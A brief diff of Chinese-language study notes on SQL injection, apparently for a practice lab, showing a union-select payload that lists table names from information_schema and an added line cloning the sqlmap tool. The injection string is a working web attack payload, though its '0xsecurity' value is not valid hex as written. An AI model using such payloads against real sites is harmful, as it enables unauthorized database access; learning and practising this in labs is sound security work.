@@ -91,4 +91,6 @@ Encoding 下拉Hex Encode 0x 表示16 进至
 ?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=0xsecurity --+
 
 
-
+========================================================
+git clone https://github.com/sqlmapproject/sqlmap
+安装sqlmap 工具
